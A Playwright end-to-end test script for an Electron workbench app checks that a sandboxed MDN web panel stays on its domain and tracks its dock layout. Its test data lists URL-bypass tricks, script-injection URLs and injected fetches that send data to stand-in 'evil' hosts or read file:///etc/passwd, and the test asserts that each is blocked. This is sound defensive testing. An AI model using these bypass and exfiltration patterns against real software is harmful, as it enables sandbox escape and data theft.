// 端到端：网页面板（H9，SDK §6.3 / §12.2）。用 SDK 的 web-adapter 模板（MDN，仅 developer.mozilla.org），开发者模式安装。
//   网页面板与 PDF 分栏并排；拖动分隔条、切换标签、最大化、切换工作区时网页视图严格跟随面板（主进程视图矩形 = DOM 占位矩形）
//   重启后恢复 URL（去掉 query）与滚动位置；SDK 测试中的 11 种越界写法在真实应用中都被拦截（页面发起 + 插件/IPC 发起）
//   弹窗、下载、域外子资源被拦截；离开域名的链接：横幅 → 确认 → 系统浏览器（shell.openExternal 被替换为记录函数）
//   工作台菜单与对话框显示在网页面板之上（X 屏幕截图像素对比）；分区隔离、无 kbfile:、权限请求全部拒绝；卸载删除网站数据
// 网络：默认先探测 https://developer.mozilla.org；连不上（或 KB_E2E_WEB_MODE=fixture）时用本地夹具站点
// （KB_TEST_WEB_FIXTURE=e2e/fixtures/web，仅测试：插件分区的 https 由本地目录响应，域名检查不变），见 docs/06 §11.6。
import { _electron as electron } from 'playwright';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { grabWindow, hasX, regionDiff } from './lib/xshot.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const SDK = process.env.KB_ADAPTER_SDK_DIR || path.resolve(ROOT, '../kb-adapter-sdk');
const VERIFY = path.join(ROOT, 'verify');
const TMP = path.join(ROOT, 'e2e/.tmp');
const USERDATA = path.join(TMP, 'userdata-web');
const RA = path.join(TMP, 'web 资料');
const PLUG = path.join(TMP, 'plugins-web');
for (const d of [USERDATA, RA, PLUG]) fs.rmSync(d, { recursive: true, force: true });
const put = (p, c) => (fs.mkdirSync(path.dirname(p), { recursive: true }), fs.writeFileSync(p, c));
put(path.join(RA, '说明.md'), '# 说明\n\n网页面板与 PDF 并排阅读。\n');
put(path.join(RA, 'big.pdf'), makePdf(40));
fs.mkdirSync(VERIFY, { recursive: true });
const build = (src, name) => {
  const out = path.join(PLUG, name);
  execFileSync(process.execPath, [path.join(ROOT, 'scripts/build-adapter-plugin.mjs'), src, '--out', out], { stdio: 'inherit' });
  return out;
};
const P_WEB = build(path.join(SDK, 'templates/web-adapter'), 'mdn');
// 旧版夹具：同一模板打包后把 manifest 换回 v0.1.0 的声明（SDK 050df08：只有 domains，没有 resourceDomains），用来验证升级后 declHash 变化 → 重新询问
const P_WEB_OLD = path.join(PLUG, 'mdn-0.1.0');
fs.cpSync(P_WEB, P_WEB_OLD, { recursive: true });
{
  const mf = JSON.parse(fs.readFileSync(path.join(P_WEB_OLD, 'manifest.json'), 'utf8'));
  mf.version = '0.1.0';
  const net = mf.contributes.adapters[0].permissions.find((x) => x.kind === 'net');
  delete net.resourceDomains;
  net.reason = '在面板中加载 MDN 文档页面';
  fs.writeFileSync(path.join(P_WEB_OLD, 'manifest.json'), JSON.stringify(mf, null, 2));
}
const NEW_RES = ['bcd.developer.mozilla.org', '*.mdnplay.dev', 'mdn.github.io'];
const PID = 'example.mdn-docs';
const AID = 'example.mdn-docs.web';
const PAGE = 'https://developer.mozilla.org/zh-CN/docs/Web/JavaScript';

async function reachable() {
  if (process.env.KB_E2E_WEB_MODE === 'fixture') return false;
  try {
    const r = await fetch('https://developer.mozilla.org/zh-CN/', { signal: AbortSignal.timeout(8000) });
    return r.ok;
  } catch {
    return false;
  }
}
const LIVE = await reachable();
const MODE = LIVE ? 'live（真实 developer.mozilla.org）' : 'fixture（本地夹具站点）';
console.log(`网页模式：${MODE}`);
const extraEnv = LIVE ? {} : { KB_TEST_WEB_FIXTURE: path.join(ROOT, 'e2e/fixtures/web') };

function makePdf(n) {
  const objs = [];
  const add = (s) => (objs.push(s), objs.length);
  const catalog = add('');
  const pages = add('');
  const font = add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
  const kids = [];
  for (let i = 1; i <= n; i++) {
    const text = `BT /F1 28 Tf 72 700 Td (Page ${i} of ${n}) Tj ET BT /F1 12 Tf 72 660 Td (PDF beside a web panel, page ${i}.) Tj ET`;
    const c = add(`<< /Length ${text.length} >>\nstream\n${text}\nendstream`);
    kids.push(add(`<< /Type /Page /Parent ${pages} 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 ${font} 0 R >> >> /Contents ${c} 0 R >>`));
  }
  objs[catalog - 1] = `<< /Type /Catalog /Pages ${pages} 0 R >>`;
  objs[pages - 1] = `<< /Type /Pages /Count ${n} /Kids [${kids.map((k) => `${k} 0 R`).join(' ')}] >>`;
  let out = '%PDF-1.4\n';
  const offs = [];
  objs.forEach((o, i) => {
    offs.push(Buffer.byteLength(out));
    out += `${i + 1} 0 obj\n${o}\nendobj\n`;
  });
  const xref = Buffer.byteLength(out);
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offs.map((o) => String(o).padStart(10, '0') + ' 00000 n \n').join('')}trailer\n<< /Size ${objs.length + 1} /Root ${catalog} 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return out;
}

const results = [];
const metrics = { mode: MODE };
function check(name, ok, detail = '') {
  results.push({ name, ok: !!ok, detail });
  console.log(`${ok ? '✔' : '✘'} ${name}${detail ? '  — ' + detail : ''}`);
}
const consoleErrors = [];
async function launch() {
  const app = await electron.launch({ args: ['.', '--no-sandbox', '--disable-gpu', '--force-device-scale-factor=1'], cwd: ROOT, env: { ...process.env, KB_USER_DATA: USERDATA, ...extraEnv } });
  const win = await app.firstWindow();
  win.on('crash', () => console.log('   !! 主窗口页面崩溃'));
  win.on('console', (m) => {
    if (m.type() === 'error' && !/403|ERR_|Content Security Policy|Refused to/.test(m.text())) consoleErrors.push(m.text());
  });
  await win.waitForLoadState('domcontentloaded');
  await app.evaluate(({ BrowserWindow }) => {
    const w = BrowserWindow.getAllWindows()[0];
    w.setPosition(0, 0);
    w.setContentSize(1280, 800);
  });
  await win.waitForFunction(() => window.__layoutRestored === true, null, { timeout: 20000 });
  await win.waitForTimeout(500);
  // 系统浏览器：替换为记录函数（不真的打开）
  await app.evaluate(({ shell }) => {
    globalThis.__opened = [];
    shell.openExternal = async (u) => void globalThis.__opened.push(u);
  });
  return { app, win };
}
const stubOpen = (app, p) =>
  app.evaluate(({ dialog }, x) => {
    dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [x] });
  }, p);
async function addRoot(app, win, dir) {
  const n = await win.locator('[data-testid="root-row"]').count();
  await stubOpen(app, dir);
  await win.click('[data-testid="pick-folder"]');
  await win.waitForFunction((k) => document.querySelectorAll('[data-testid="root-row"]').length === k + 1, n);
  return win.evaluate(async (p) => (await window.kb.listRoots()).find((r) => r.path === p).id, dir);
}
const openP = (win, rootId, rel, mode) => win.evaluate(([r, p, m]) => window.__kb.openByPath(r, p, m), [rootId, rel, mode]);
async function openManager(win, focus) {
  await win.evaluate((f) => window.__kb.openPluginManager(f), focus);
  await win.waitForSelector('[data-testid="plugin-manager"]');
  await win.waitForTimeout(200);
}
async function closeManager(win) {
  await win.click('[data-testid="pm-close"]');
  await win.waitForSelector('[data-testid="plugin-manager"]', { state: 'detached' });
}
async function waitIndexed(win, rootId, rel) {
  for (let i = 0; i < 60; i++) {
    const ok = await win.evaluate(async ([r, p]) => (await window.kb.listDir(r, p.includes('/') ? p.slice(0, p.lastIndexOf('/')) : '')).some((x) => x.relPath === p), [rootId, rel]);
    if (ok) return true;
    await win.waitForTimeout(250);
  }
  return false;
}
/** 主进程中的网页视图 */
const views = (app) =>
  app.evaluate(() =>
    [...globalThis.__kbWeb.views.values()].map((e) => ({ viewId: e.viewId, wcId: e.wc.id, url: e.wc.getURL(), bounds: e.bounds, viewBounds: e.view.getBounds(), visible: e.view.getVisible(), pluginId: e.pluginId, partition: e.partition })),
  );
const webStats = (app) => app.evaluate(() => JSON.parse(JSON.stringify(globalThis.__kbWeb.stats)));
/** 在网页（页面主世界）中执行；userGesture=true（模拟用户点击） */
const pageEval = (app, code) =>
  app.evaluate(async (_e, c) => {
    const e = [...globalThis.__kbWeb.views.values()][0];
    return e.wc.executeJavaScript(c, true);
  }, code);
const curUrl = (app) => app.evaluate(() => [...globalThis.__kbWeb.views.values()][0]?.wc.getURL() ?? null);
const slotRect = (win) =>
  win.evaluate(() => {
    const el = document.querySelector('[data-testid="web-slot"]');
    if (!el) return null;
    const r = el.getBoundingClientRect();
    return { x: Math.round(r.left), y: Math.round(r.top), width: Math.round(r.right) - Math.round(r.left), height: Math.round(r.bottom) - Math.round(r.top) };
  });
const frames = (win, n = 2) => win.evaluate((k) => new Promise((res) => { let i = 0; const f = () => (++i >= k ? res() : requestAnimationFrame(f)); requestAnimationFrame(f); }), n);
/** DOM 占位矩形与主进程视图矩形的最大偏差（px）；视图必须可见 */
async function boundsDev(app, win) {
  await frames(win, 3);
  const [r, v] = [await slotRect(win), (await views(app))[0]];
  if (!r || !v || !v.visible || !v.bounds) return { dev: Infinity, r, v: v?.viewBounds, visible: v?.visible };
  const b = v.viewBounds;
  return { dev: Math.max(Math.abs(b.x - r.x), Math.abs(b.y - r.y), Math.abs(b.width - r.width), Math.abs(b.height - r.height)), r, v: b, visible: v.visible };
}
async function waitReady(win, urlPrefix, timeout = 45000) {
  await win.waitForFunction((u) => {
    const el = document.querySelector('[data-testid="web-panel"]');
    return el && el.dataset.load === 'ready' && el.dataset.url.startsWith(u);
  }, urlPrefix, { timeout });
}
const webItem = (win) => win.evaluate(() => Object.values(window.__kb.items()).find((i) => i.sourceKind === 'web' && i.adapterId === 'example.mdn-docs.web'));
const SHOTS = process.env.KB_E2E_WEB_SHOTS !== '0';
async function shot(app, win, name) {
  const file = SHOTS ? path.join(VERIFY, name) : path.join(TMP, name);
  if (hasX()) await grabWindow(app, file);
  else await win.screenshot({ path: file });
  return file;
}

// ============================================================ 启动、安装
let { app, win } = await launch();
// 记录索引状态栏出现过的错误（例如并发写库的 database is locked）
const watchIndexErrors = (w) => w.evaluate(() => {
  window.__idxErrors = [];
  const scan = () => document.querySelectorAll('[data-testid="index-status"][data-state="error"]').forEach((e) => window.__idxErrors.push(e.textContent.trim()));
  new MutationObserver(scan).observe(document.body, { subtree: true, childList: true, characterData: true, attributes: true, attributeFilter: ['data-state'] });
  scan();
});
const indexErrors = (w) => w.evaluate(() => window.__idxErrors || []);
let idxErrorsSession1 = [];
await watchIndexErrors(win);
const ra = await addRoot(app, win, RA);
await waitIndexed(win, ra, 'big.pdf');
await openManager(win);
await win.check('[data-testid="dev-mode-toggle"]');
await win.waitForFunction(() => !document.querySelector('[data-testid="dev-install"]').disabled);
await stubOpen(app, P_WEB_OLD);
await win.click('[data-testid="dev-install"]');
await win.waitForSelector(`[data-testid="pm-plugin-${PID}"]`);
const pmOld = await win.innerText(`[data-testid="pm-plugin-${PID}"]`);
check('旧版 MDN 网页适配器（v0.1.0 声明）经开发者模式安装成功', /0\.1\.0/.test(pmOld) && !/不兼容/.test(pmOld), pmOld.split('\n').slice(0, 2).join(' / '));
await closeManager(win);

// ============================================================ 与 PDF 分栏并排
await openP(win, ra, 'big.pdf', 'tab');
await win.waitForSelector('[data-testid="reader-pdf"], .pdf-page, canvas', { timeout: 20000 });
const tOpen = Date.now();
await win.evaluate(([a, u]) => window.__kb.openWeb(a, u, 'right'), [AID, PAGE + '?utm_source=x&token=abc#intro']);
await win.waitForSelector('[data-testid="perm-dialog"]', { timeout: 10000 });
const permOld = await win.innerText('[data-testid="perm-dialog"]');
check('首次打开询问 net 权限（v0.1.0）：范围只列出 developer.mozilla.org，显示方式“网页面板 · 仅限 developer.mozilla.org”', /仅限域名：developer\.mozilla\.org/.test(permOld) && /网页面板 · 仅限 developer\.mozilla\.org/.test(permOld) && !/页面资源另可加载自/.test(permOld), permOld.replace(/\s+/g, ' ').slice(0, 160));
await win.click('[data-testid="perm-allow"]');
await waitReady(win, PAGE);
metrics.openMs = Date.now() - tOpen;

// ---- 升级到模板 v0.2.0（resourceDomains 新增 3 项）：declHash 变化 → 旧授权失效，重新询问
await openManager(win);
await stubOpen(app, P_WEB);
await win.click('[data-testid="dev-install"]');
await win.waitForFunction((id) => /0\.2\.0/.test(document.querySelector(`[data-testid="pm-plugin-${id}"]`)?.textContent ?? ''), PID, { timeout: 10000 });
const pmText = await win.innerText(`[data-testid="pm-plugin-${PID}"]`);
check('升级为 SDK 模板 v0.2.0（engines.workbench ^0.2.0 满足）', /0\.2\.0/.test(pmText) && !/不兼容/.test(pmText), pmText.split('\n').slice(0, 3).join(' / '));
// 已打开的网页面板随插件重新加载；旧授权的 declHash 与新声明不符 → 立即再次弹出授权框（在插件管理之上）
await win.waitForSelector('[data-testid="perm-dialog"]', { timeout: 15000 });
const permText = await win.innerText('[data-testid="perm-dialog"]');
check('声明变化（新增 resourceDomains）后重新询问 net 权限，授权框列出新增的子资源域名', NEW_RES.every((d) => permText.includes(d)) && /仅限域名：developer\.mozilla\.org/.test(permText), permText.replace(/\s+/g, ' ').slice(0, 260));
const staleCreate = await win.evaluate(async ([pid, aid]) => window.kb.webCreate('wv-stale-probe', pid, aid).then(async () => (await window.kb.webDestroy('wv-stale-probe'), 'created'), (e) => String(e.message)), [PID, AID]);
check('重新询问期间旧授权不再有效：没有网页视图，主进程拒绝创建（declHash 不一致）', (await views(app)).length === 0 && /permission-denied/.test(staleCreate), JSON.stringify({ views: (await views(app)).length, staleCreate: staleCreate.slice(-120) }));
await win.waitForTimeout(450);
if (SHOTS) await win.screenshot({ path: path.join(VERIFY, 'web-grant-dialog.png') });
await win.click('[data-testid="perm-allow"]');
await closeManager(win);
await waitReady(win, PAGE);
const it0 = await webItem(win);
check('网页条目 ref 去掉了 query（sanitizeUrlForState），保留 hash', it0?.ref === PAGE + '#intro', it0?.ref);
const v0 = (await views(app))[0];
check('网页视图使用宿主派生的插件分区 persist:kbweb.example.mdn-docs', v0?.partition === 'persist:kbweb.example.mdn-docs', v0?.partition);
const label = await win.innerText('[data-testid="web-label"]');
const addr = await win.innerText('[data-testid="web-address"]');
check('面板外框：“网页面板 · 仅限 developer.mozilla.org”、只读地址、后退/前进/刷新', label.includes('网页面板 · 仅限 developer.mozilla.org') && addr.startsWith(PAGE) && (await win.locator('[data-testid="web-reload"]').count()) === 1 && (await win.locator('[data-testid="web-address"] input').count()) === 0, `${label} | ${addr}`);
const bd0 = await boundsDev(app, win);
check('网页视图与 dock 面板中的网页区域重合（偏差 ≤ 1 px）', bd0.dev <= 1, JSON.stringify(bd0));
// PDF 仍在左侧可见
const pdfRect = await win.evaluate(() => {
  const el = document.querySelector('[data-view-type="builtin.pdf"], [data-testid="reader-pdf"]');
  const r = el?.getBoundingClientRect();
  return r ? { x: r.left, w: r.width } : null;
});
check('PDF 与网页面板左右并排、互不重叠', pdfRect && pdfRect.x + pdfRect.w <= bd0.r.x + 1, JSON.stringify({ pdfRect, web: bd0.r }));
await win.waitForTimeout(800);
await shot(app, win, 'web-panel-beside-pdf.png');

// ============================================================ 拖动分隔条
const sash = await win.evaluate(() => {
  const r = document.querySelector('[data-testid="web-slot"]').getBoundingClientRect();
  // 网页面板左边缘附近的垂直分隔条
  const all = [...document.querySelectorAll('.dv-sash')].map((s) => s.getBoundingClientRect()).filter((b) => b.width > 0 && b.width < 20 && b.height > 100);
  all.sort((a, b) => Math.abs(a.left - r.left) - Math.abs(b.left - r.left));
  const b = all[0];
  return b ? { x: b.left + b.width / 2, y: b.top + b.height / 2 } : null;
});
let maxDev = 0;
let steps = 0;
if (sash) {
  await win.mouse.move(sash.x, sash.y);
  await win.mouse.down();
  for (const dx of [-40, -80, -120, -160, -120, -40, 40, 120, 200, 140]) {
    await win.mouse.move(sash.x + dx, sash.y, { steps: 2 });
    const d = await boundsDev(app, win);
    maxDev = Math.max(maxDev, d.dev);
    steps++;
  }
  await win.mouse.up();
}
const afterDrag = await boundsDev(app, win);
check('拖动分隔条：每一步网页视图都跟随面板（最大偏差 ≤ 1 px）', sash && maxDev <= 1 && afterDrag.dev <= 1, `${steps} 步，最大偏差 ${maxDev} px，最终 ${JSON.stringify(afterDrag.r)}`);
metrics.dragMaxDevPx = maxDev;

// ============================================================ 切换标签（同一组内）
const wsIdBefore = await win.evaluate(() => window.__kb.currentWorkspaceId());
const webId = it0.itemId;
const wcBefore = (await views(app))[0].wcId;
await win.evaluate((id) => window.__dock.getPanel(id).api.setActive(), webId);
await openP(win, ra, '说明.md', 'tab');
await win.waitForSelector('[data-testid="reader-markdown"] h1');
await frames(win, 4);
const hid = (await views(app))[0];
check('网页面板所在组切到别的标签：网页视图隐藏', hid && hid.visible === false && hid.bounds === null, JSON.stringify({ visible: hid?.visible, bounds: hid?.bounds }));
await win.evaluate((id) => window.__dock.getPanel(id).api.setActive(), webId);
const back = await boundsDev(app, win);
const wcAfter = (await views(app))[0].wcId;
check('切回网页标签：视图重新显示、位置正确、网页没有重建（同一 webContents）', back.dev <= 1 && wcAfter === wcBefore, JSON.stringify({ dev: back.dev, wcBefore, wcAfter }));

// ============================================================ 最大化
await win.evaluate((id) => window.__dock.getPanel(id).api.maximize(), webId);
const mx = await boundsDev(app, win);
await win.evaluate((id) => window.__dock.getPanel(id).api.exitMaximized(), webId);
const unmx = await boundsDev(app, win);
check('最大化 / 还原：网页视图跟随（偏差 ≤ 1 px）', mx.dev <= 1 && unmx.dev <= 1 && mx.r.width > unmx.r.width, JSON.stringify({ max: mx.r, restored: unmx.r }));

// ============================================================ 滚动并保存
await pageEval(app, 'window.scrollTo(0, 1600); window.scrollY');
await win.waitForFunction(() => {
  const i = Object.values(window.__kb.items()).find((x) => x.sourceKind === 'web');
  return i?.state?.data?.scrollY >= 1500;
}, null, { timeout: 10000 }).catch(() => undefined);
const itS = await webItem(win);
check('滚动位置经宿主隔离世界读取并保存到条目状态（v1 {url, scrollY}）', itS?.state?.v === 1 && itS.state.data.scrollY >= 1500 && !/[?]/.test(itS.state.data.url), JSON.stringify(itS?.state));

// ============================================================ 切换工作区
await win.waitForTimeout(1200); // 平滑滚动结束、状态写入
const savedY = (await webItem(win)).state.data.scrollY;
const wsEmpty = await win.evaluate(() => window.kb.createWorkspace('空白', '测试', { schema: 4, dock: null, shell: { sidebarWidth: 260 } }).then((w) => w.id));
await win.evaluate((id) => window.__kb.switchTo(id), wsEmpty);
await win.waitForTimeout(800);
const inEmpty = await views(app);
check('切换到另一个工作区：网页视图被移除（不残留、不浮在新工作区上）', inEmpty.length === 0, `视图数 ${inEmpty.length}`);
await win.evaluate((id) => window.__kb.switchTo(id), wsIdBefore);
await win.waitForSelector('[data-testid="web-panel"]', { timeout: 20000 });
await waitReady(win, PAGE);
await win.waitForTimeout(1200);
const backWs = await boundsDev(app, win);
const sy = await pageEval(app, 'Math.round(scrollY)');
check('切回原工作区：网页面板恢复（URL、滚动位置），位置正确', backWs.dev <= 1 && Math.abs(sy - savedY) <= 40, JSON.stringify({ dev: backWs.dev, scrollY: sy, saved: savedY, url: await curUrl(app) }));

// ============================================================ 11 种越界写法（SDK web-adapter 测试）
const EVIL = [
  'https://evil.example.com/',
  'https://developer.mozilla.org.evil.com/',
  'https://developer.mozilla.org@evil.com/',
  'https://evil.com/?u=https://developer.mozilla.org/',
  'http://developer.mozilla.org/',
  'https://developer.mozilla.org:8443/',
  'https://sub.developer.mozilla.org/',
  'javascript:alert(1)',
  'file:///C:/Windows/win.ini',
  'data:text/html,<script>alert(1)</script>',
  'kbfile://res/abc/secret.txt',
];
const startUrl = await curUrl(app);
await pageEval(app, 'window.alert = () => { document.documentElement.dataset.alerted = "1"; }; 1');
const pageResults = [];
for (const u of EVIL) {
  // (a) 页面脚本赋值 location；(b) 用户点击链接
  await pageEval(app, `try { location.href = ${JSON.stringify(u)}; } catch (e) {} 1`).catch(() => undefined);
  await win.waitForTimeout(350);
  const a = await curUrl(app);
  await pageEval(app, `(() => { const a = document.createElement('a'); a.href = ${JSON.stringify(u)}; document.body.appendChild(a); a.click(); a.remove(); return 1; })()`).catch(() => undefined);
  await win.waitForTimeout(350);
  const b = await curUrl(app);
  pageResults.push({ u, stayed: a === startUrl && b === startUrl });
}
const leaked = pageResults.filter((r) => !r.stayed);
check('11 种越界写法（页面赋值 location + 点击链接，共 22 次）都没有离开原页面', leaked.length === 0, leaked.length ? JSON.stringify(leaked) : `仍在 ${startUrl}`);
const viewId = (await views(app))[0].viewId;
const ipcResults = await win.evaluate(async ([id, list]) => Promise.all(list.map(async (u) => ({ u, r: await window.kb.webNavigate(id, u) }))), [viewId, EVIL]);
check('同样 11 个地址经插件/IPC 的 navigate 全部被主进程拒绝（domain-blocked / scheme-blocked / invalid-url）', ipcResults.every((x) => x.r.ok === false), ipcResults.map((x) => x.r.reason).join(','));
const pluginNav = await win.evaluate(async (id) => window.kb.webNavigate(id, 'https://www.google.com/'), viewId);
check('插件导航到 www.google.com → {ok:false, reason:"domain-blocked"}', pluginNav.ok === false && pluginNav.reason === 'domain-blocked', JSON.stringify(pluginNav));
const st1 = await webStats(app);
metrics.blockedNavigations = st1.blockedNavigations.length;
check('被拦截的导航都由主进程记录（will-navigate / navigate 检查）', st1.blockedNavigations.length >= 8, `${st1.blockedNavigations.length} 次；原因：${[...new Set(st1.blockedNavigations.map((b) => b.reason))].join('、')}`);
await win.waitForSelector('[data-testid="web-blocked-banner"]', { timeout: 5000 });
check('被拦截的导航在面板顶部显示横幅', (await win.locator('[data-testid="web-blocked-banner"]').count()) === 1);
await win.click('[data-testid="web-banner-close"]');

// ============================================================ 弹窗、下载、子资源
await pageEval(app, `window.open('https://ads.example.com/'); window.open('/zh-CN/docs/Web/CSS'); 1`);
await pageEval(app, `(() => { const a = document.createElement('a'); a.href = 'data:application/zip;base64,UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA=='; a.download = 'x.zip'; document.body.appendChild(a); a.click(); a.remove(); return 1; })()`);
await pageEval(
  app,
  `(() => {
    const img = new Image(); img.src = 'https://tracker.example.com/t.png?' + Date.now(); document.body.appendChild(img);
    const f = document.createElement('iframe'); f.src = 'https://evil.example.com/frame'; document.body.appendChild(f);
    const s = document.createElement('script'); s.src = 'https://cdn.evil.example.net/x.js'; document.body.appendChild(s);
    fetch('https://api.evil.example.com/collect', { method: 'POST', body: 'x', mode: 'no-cors' }).catch(() => {});
    fetch('kbfile://res/abc/secret.txt').then(() => document.documentElement.dataset.kbfile = 'ok', () => document.documentElement.dataset.kbfile = 'blocked');
    fetch('file:///etc/passwd').then(() => document.documentElement.dataset.file = 'ok', () => document.documentElement.dataset.file = 'blocked');
    return 1; })()`,
);
await win.waitForTimeout(1500);
const st2 = await webStats(app);
const reasons = st2.blockedNavigations.map((b) => b.reason);
check('window.open 弹窗被拦截（popups: block），包括域内弹窗', reasons.filter((r) => r === 'popup-blocked').length >= 2, `${reasons.filter((r) => r === 'popup-blocked').length} 次`);
check('下载被拦截（downloads: block）', reasons.includes('download-blocked'));
const resHosts = [...new Set(st2.blockedResources.map((r) => { try { return new URL(r.url).host; } catch { return r.url.slice(0, 20); } }))];
const injected = ['tracker.example.com', 'evil.example.com', 'cdn.evil.example.net', 'api.evil.example.com'];
// 子框架：被拦截时停在错误页（chrome-error://）或空白页，不会是 evil 的真实内容
const loadedEvil = await app.evaluate(async () => { const out = []; for (const f of [...globalThis.__kbWeb.views.values()][0].wc.mainFrame.framesInSubtree) { if (!/evil/.test(f.url)) continue; const body = await f.executeJavaScript('document.body ? document.body.innerText.slice(0, 80) : ""').catch(() => '(无法执行)'); out.push({ url: f.url, origin: f.origin, body }); } return out.filter((x) => x.origin && x.origin !== 'null' && /evil/.test(x.origin)); });
const imgOk = await pageEval(app, `[...document.images].filter((i) => i.src.includes('tracker.example.com') && i.naturalWidth > 0).length`);
if (LIVE) {
  // 真实 MDN 自带严格 CSP，注入的域外请求先被页面 CSP 拦下（到不了 webRequest）；宿主拦截由 MDN 自己发出的域外请求（遥测等）证明，
  // 注入请求在 fixture 模式（无 CSP）下逐个验证。
  const foreign = resHosts.filter((h) => h !== 'developer.mozilla.org');
  check('域外子资源未加载：MDN 自身的域外请求被宿主 webRequest 拦截（D1），注入的图片/子框架/脚本/fetch 也都没有加载', foreign.length > 0 && loadedEvil.length === 0 && imgOk === 0, `宿主拦截：${foreign.join('、')}；子框架 ${JSON.stringify(loadedEvil)}；已加载图片 ${imgOk}；注入请求见 fixture 模式`);
} else check('域外子资源（图片、子框架、脚本、fetch）全部被宿主 webRequest 拦截（D1）', injected.every((h) => resHosts.includes(h)) && loadedEvil.length === 0 && imgOk === 0, resHosts.join('、'));
const kbf = await pageEval(app, '[document.documentElement.dataset.kbfile, document.documentElement.dataset.file]');
check('网页中 fetch kbfile:// 与 file:// 都失败（分区未注册 kbfile:，非 https 取消）', kbf[0] === 'blocked' && kbf[1] === 'blocked', JSON.stringify(kbf));
const resBadge = await win.locator('[data-testid="web-res-blocked"]').innerText().catch(() => '');
check('外框显示已拦截的外部资源数', /已拦截 \d+ 个外部资源/.test(resBadge), resBadge);
check('拦截期间页面仍在原地址', (await curUrl(app)) === startUrl, await curUrl(app));

// ============================================================ 加固设置
const hard = await app.evaluate(async ({ session }) => {
  const e = [...globalThis.__kbWeb.views.values()][0];
  const p = e.wc.getLastWebPreferences();
  const ses = session.fromPartition('persist:kbweb.example.mdn-docs');
  e.wc.openDevTools();
  await new Promise((r) => setTimeout(r, 300));
  return {
    nodeIntegration: p.nodeIntegration,
    contextIsolation: p.contextIsolation,
    sandbox: p.sandbox,
    webSecurity: p.webSecurity,
    devTools: p.devTools,
    preload: p.preload ?? null,
    devtoolsOpened: e.wc.isDevToolsOpened(),
    sameSession: e.wc.session === ses,
    notDefault: e.wc.session !== session.defaultSession,
    kbfileHandled: ses.protocol.isProtocolHandled('kbfile'),
  };
});
check('webPreferences 加固：nodeIntegration=false、contextIsolation、sandbox、webSecurity、无 preload、DevTools 禁用', hard.nodeIntegration === false && hard.contextIsolation === true && hard.sandbox === true && hard.webSecurity !== false && hard.devTools !== true && !hard.preload && hard.devtoolsOpened === false, JSON.stringify(hard));
check('分区独立于工作台主会话，未注册 kbfile:', hard.sameSession && hard.notDefault && hard.kbfileHandled === false);
const perms = await pageEval(app, `Promise.all([navigator.permissions.query({ name: 'geolocation' }).then((p) => p.state), Notification.requestPermission(), navigator.mediaDevices?.getUserMedia({ video: true }).then(() => 'granted', (e) => 'denied:' + e.name) ?? 'n/a'])`);
check('权限请求全部被拒（定位、通知、摄像头）', perms[0] !== 'granted' && perms[1] === 'denied' && String(perms[2]).startsWith('denied'), JSON.stringify(perms));

// ============================================================ 离开域名的链接：横幅 → 确认 → 系统浏览器（D2）
await pageEval(app, `(() => { const a = document.createElement('a'); a.href = 'https://github.com/mdn/content'; a.textContent = 'GitHub'; document.body.prepend(a); a.click(); return 1; })()`);
await win.waitForSelector('[data-testid="web-blocked-banner"] [data-testid="web-open-external"]', { timeout: 5000 });
await win.click('[data-testid="web-open-external"]');
await win.waitForSelector('[data-testid="dialog"]');
await win.waitForTimeout(500);
const covConfirm = await win.getAttribute('[data-testid="web-panel"]', 'data-covered');
const vConfirm = (await views(app))[0];
const dlgText = await win.innerText('[data-testid="dialog"]');
check('“用系统浏览器打开…” 先弹确认框；确认框打开期间网页视图隐藏（对话框不被遮挡）', covConfirm === 'true' && vConfirm.visible === false && /github\.com\/mdn\/content/.test(dlgText), JSON.stringify({ covConfirm, visible: vConfirm.visible }));
const confirmShot = await shot(app, win, 'web-offdomain-confirm.png');
if (hasX()) {
  const domShot = path.join(TMP, 'web-confirm-dom.png');
  await win.screenshot({ path: domShot });
  const sr = await slotRect(win);
  const d = regionDiff(confirmShot, domShot, { x: sr.x + 4, y: sr.y + 4, width: sr.width - 8, height: sr.height - 8 });
  check('确认框打开时，屏幕上网页区域显示的是 DOM（截图 + 遮罩），不是原生视图', d < 6, `像素差 ${d.toFixed(2)}`);
}
await win.click('[data-testid="dialog-ok"]');
await win.waitForTimeout(400);
const opened = await app.evaluate(() => globalThis.__opened.slice());
check('确认后调用 shell.openExternal（https）', opened.includes('https://github.com/mdn/content'), JSON.stringify(opened));
// http 链接：被拦截但不提供系统浏览器（只允许 https）
await pageEval(app, `(() => { const a = document.createElement('a'); a.href = 'http://example.org/'; document.body.prepend(a); a.click(); return 1; })()`);
await win.waitForFunction(() => document.querySelector('[data-testid="web-blocked-banner"]')?.textContent.includes('http://example.org/'), null, { timeout: 5000 });
check('http 链接被拦截，横幅不提供“用系统浏览器打开”（D2：只允许 https）', (await win.locator('[data-testid="web-open-external"]').count()) === 0);
const ext = await win.evaluate(async (id) => ({
  http: await window.kb.webOpenExternal('http://example.org/', { viewId: id }),
  file: await window.kb.webOpenExternal('file:///etc/passwd', {}),
  ms: await window.kb.webOpenExternal('ms-settings:privacy', {}),
  userinfo: await window.kb.webOpenExternal('https://a:b@evil.com/', {}),
  notBlocked: await window.kb.webOpenExternal('https://evil.example.org/never-blocked', { viewId: id }),
}), viewId);
const opened2 = await app.evaluate(() => globalThis.__opened.slice());
check('主进程 openExternal 拒绝 http、file:、ms-*:、带账号的地址，以及不是本面板刚拦截的地址', Object.values(ext).every((r) => r.ok === false) && opened2.length === 1, JSON.stringify(Object.fromEntries(Object.entries(ext).map(([k, v]) => [k, v.reason]))));
await win.click('[data-testid="web-banner-close"]');

// ============================================================ 菜单与对话框在网页视图之上
await win.waitForTimeout(800);
const plainFile = path.join(TMP, 'web-plain.png');
if (hasX()) await grabWindow(app, plainFile);
await win.click('[data-testid="appearance-button"]');
await win.waitForSelector('[data-testid="appearance-menu"]');
await frames(win, 4);
const menuRect = await win.evaluate(() => {
  const r = document.querySelector('[data-testid="appearance-menu"]').getBoundingClientRect();
  return { x: r.left, y: r.top, width: r.width, height: r.height };
});
const web = await slotRect(win);
